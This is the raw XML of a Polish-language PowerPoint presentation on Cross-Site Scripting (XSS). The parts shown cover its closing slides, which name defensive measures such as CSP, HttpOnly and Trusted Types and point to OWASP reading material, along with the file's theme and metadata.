            <a:off x="1110357" y="2575421"/>
            <a:ext cx="4925916"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ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Każde </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> czy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> to czerwona flaga.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6299200" y="2575421"/>
            <a:ext cx="160734" cy="629841"/>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08A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6586934" y="2575421"/>
            <a:ext cx="4936034"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ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Warstwy: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CSP, HttpOnly, Trusted Types</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECE9E2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> – na wypadek, gdy coś przeoczysz.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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E8B84"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-Site Scripting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C4561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BF6F0"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/prezentacja&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2075259"/>
            <a:ext cx="10883392" cy="2159000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="8400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="8000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FBF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Dziękuję!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="8400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="8000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FBF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Pytania?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="5222478"/>
            <a:ext cx="108833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BF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Do poczytania: OWASP XSS Prevention Cheat Sheet · OWASP DOM based XSS Prevention Cheat Sheet · PortSwigger Web Security Academy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>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pl-PL" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FBF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Adam Minior Antoni Pietraszewski</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Cross-Site Scripting (XSS)">
  <a:themeElements>
    <a:clrScheme name="Cross-Site Scripting (XSS)">
      <a:dk1>
        <a:srgbClr val="1B1D22"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="F4F2EC"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="515255"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="DEDDD8"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="C4561F"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="F08A4B"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="2F6DB3"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FBE3D2"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="7FB3EA"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="4A4D55"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0563C1"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="954F72"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Cross-Site Scripting (XS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2564</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panoramiczny</PresentationFormat>
  <Paragraphs>224</Paragraphs>
  <Slides>18</Slides>
  <Notes>18</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18</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="22" baseType="lpstr">
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>IBM Plex Sans</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting (XSS)</vt:lpstr>
      <vt:lpstr>Cross-Site Scripting</vt:lpstr>
      <vt:lpstr>Plan prezentacji</vt:lpstr>
      <vt:lpstr>Atakujący wstrzykuje własny skrypt do strony, a przeglądarka ofiary wykonuje go tak, jakby pochodził z zaufanej aplikacji.</vt:lpstr>
      <vt:lpstr>Dlaczego to wciąż ważne</vt:lpstr>
      <vt:lpstr>Same-Origin Policy: dlaczego to działa</vt:lpstr>
      <vt:lpstr>Trzy rodzaje XSS</vt:lpstr>
      <vt:lpstr>Wyszukiwarka, która odbija zapytanie</vt:lpstr>
      <vt:lpstr>Komentarz, który atakuje każdego czytelnika</vt:lpstr>
      <vt:lpstr>Źródło → sink, wszystko w przeglądarce</vt:lpstr>
      <vt:lpstr>Co może zrobić atakujący</vt:lpstr>
      <vt:lpstr>profili zainfekował robak „Samy” w niespełna dobę – stored XSS, który kopiował się do profilu każdej odwiedzającej osoby.</vt:lpstr>
      <vt:lpstr>Koduj dane tam, gdzie je wstawiasz</vt:lpstr>
      <vt:lpstr>Pozwól frameworkowi kodować za ciebie</vt:lpstr>
      <vt:lpstr>CSP: przeglądarka wykonuje tylko zaufane skrypty</vt:lpstr>
      <vt:lpstr>Ogranicz szkody i zamknij niebezpieczne API</vt:lpstr>
      <vt:lpstr>Jak szukać XSS we własnej aplikacji</vt:lpstr>
      <vt:lpstr>Podsumowanie</vt:lpstr>
      <vt:lpstr>Dziękuję! Pytania?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Cross-Site Scripting (XSS)</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Adam Minior</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-26T19:29:48Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-28T00:24:45Z</dcterms:modified>
</cp:coreProperties>
</file>